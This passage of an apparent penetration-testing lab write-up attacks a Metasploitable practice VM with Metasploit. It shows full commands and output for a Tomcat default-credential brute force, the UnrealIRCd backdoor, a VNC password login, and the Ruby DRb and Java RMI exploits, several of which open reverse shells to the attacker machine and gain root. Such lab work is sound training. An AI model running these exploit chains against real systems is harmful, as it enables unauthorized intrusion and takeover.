[-] 172.16.243.143:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 172.16.243.143:8180 - Login Successful: tomcat:tomcat
[-] 172.16.243.143:8180 - LOGIN FAILED: both:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:root (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: xampp:xampp (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Bingo! It turns out that one pair of default credentials, `tomcat` / `tomcat`, were bring using by the management interface for the Tomcat application. This further enabled the use of the `exploit/multi/http/tomcat_mgr_deploy` exploit to gain a shell on the target server:

```
msf auxiliary(scanner/http/tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
HttpUsername => tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
HttpPassword => tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
rport => 8180
msf exploit(multi/http/tomcat_mgr_deploy) > run

[*] Started reverse TCP handler on 172.16.243.144:4444
[*] Attempting to automatically select a target...
[*] Automatically selected target "Linux x86"
[*] Uploading 6279 bytes as CmEAflXTKfIlg9DUi4VaKueJd7.war ...
[*] Executing /CmEAflXTKfIlg9DUi4VaKueJd7/aB8I27TFaCcggxL7zt1BqigP.jsp...
[*] Undeploying CmEAflXTKfIlg9DUi4VaKueJd7 ...
[*] Sending stage (53837 bytes) to 172.16.243.143
[*] Meterpreter session 6 opened (172.16.243.144:4444 -> 172.16.243.143:51511) at 2018-03-25 19:31:02 -0400

meterpreter > getuid
Server username: tomcat55
meterpreter > getwd
/
```

### UnrealIRCd

Another service running on the target system was the UnrealIRCd daemon. A search in Metasploit turned up an exploit that leveraged a backdoor for remote command execution. Running this exploit against the target system returned a fresh shell, in this case another root process.

```
msf > search unrealircd

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution


msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 172.16.243.144:4444
[*] 172.16.243.143:6667 - Connected to 172.16.243.143:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 172.16.243.143:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo TGzZR4D3jPBPYfwb;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "TGzZR4D3jPBPYfwb\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 7 opened (172.16.243.144:4444 -> 172.16.243.143:60426) at 2018-03-25 20:04:59 -0400

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

### VNC

Running the default configuration of the `auxiliary/scanner/vnc/vnc_login` Metasploit module led to a successful login credential, using the basic password: `password`

```
msf > use auxiliary/scanner/vnc/vnc_login
msf auxiliary(scanner/vnc/vnc_login) > run

[*] 172.16.243.143:5900   - 172.16.243.143:5900 - Starting VNC login sweep
[!] 172.16.243.143:5900   - No active DB -- Credential data will not be saved!
[+] 172.16.243.143:5900   - 172.16.243.143:5900 - Login Successful: :password
[*] 172.16.243.143:5900   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From my attacker machine, I could then leverage this credential to access the system directly:

```
root@kali:~# vncviewer target
Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Password:
Authentication successful
...
```

### Ruby DRb RMI

Looking at some of the remaining ports, port 8787's Ruby DRb RMI seemed particularly interesting.

```
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
```

Therefore, I decided to do a search in Metasploit for the drb service, and found a Linux exploit that seemed promising (`exploit/linux/misc/drb_remote_codeexec`). Running that against the target system led immediately to another fresh shell, with root privileges.

```
msf > search drb
Matching Modules
================

   Name                                                   Disclosure Date  Rank       Description
   ----                                                   ---------------  ----       -----------
   exploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  Distributed Ruby Remote Code Execution
   exploit/multi/misc/wireshark_lwres_getaddrbyname       2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow
   exploit/multi/misc/wireshark_lwres_getaddrbyname_loop  2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)


msf > use exploit/linux/misc/drb_remote_codeexec
msf exploit(linux/misc/drb_remote_codeexec) > run

[*] Started reverse TCP double handler on 172.16.243.144:4444
[*] Trying to exploit instance_eval method
[!] Target is not vulnerable to instance_eval method
[*] Trying to exploit syscall method
[!] Target is not vulnerable to syscall method
[*] Trying to exploit trap method
[*] Accepted the first client connection...
[!] Target is not vulnerable to trap method
[*] Accepted the second client connection...
[*] Command: echo xRb0HkSAZmhcjkV2;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "xRb0HkSAZmhcjkV2\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 8 opened (172.16.243.144:4444 -> 172.16.243.143:57407) at 2018-03-25 21:17:00 -0400

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

### Java RMI

Another service that was running, available for exploitation was the Java RMI Registry on port 1099:

```
1099/tcp  open  java-rmi    Java RMI Registry
```

Doing a quick search in Metasploit, I was able to find an exploit that looked promising.

```
msf > search java rmi
...
exploit/multi/misc/java_rmi_server                              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution
...
```

Loading this up, and configuring the payload to return to my attacker machine, I was able to exploit the vulnerability and get back a meterpreter session with root privileges.

```
msf > use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST      172.16.243.143   yes       The target address
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf exploit(multi/misc/java_rmi_server) > set lhost 172.16.243.144
lhost => 172.16.243.144
msf exploit(multi/misc/java_rmi_server) > run

[*] Started reverse TCP handler on 172.16.243.144:4444
[*] 172.16.243.143:1099 - Using URL: http://0.0.0.0:8080/t3sFon2Uy6K
[*] 172.16.243.143:1099 - Local IP: http://172.16.243.144:8080/t3sFon2Uy6K
[*] 172.16.243.143:1099 - Server started.
[*] 172.16.243.143:1099 - Sending RMI Header...
[*] 172.16.243.143:1099 - Sending RMI Call...
[*] 172.16.243.143:1099 - Replied to request for payload JAR
[*] Sending stage (53837 bytes) to 172.16.243.143
[*] Meterpreter session 9 opened (172.16.243.144:4444 -> 172.16.243.143:48518) at 2018-03-25 21:30:34 -0400
[-] 172.16.243.143:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
[*] 172.16.243.143:1099 - Server stopped.
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/java_rmi_server) > sessions -i 9
[*] Starting interaction with 9...

meterpreter > id
[-] Unknown command: id.
meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer    : metasploitable
OS          : Linux 2.6.24-16-server (i386)
Meterpreter : java/linux
meterpreter > shell
Process 1 created.
```

## Wrapping Up

At this point, I wrapped up for my afternoon of exploitation. I had made by way through most of the service exploitations, though I really hadn't tackled the web server exploitation. Perhaps I attack that in a future article.
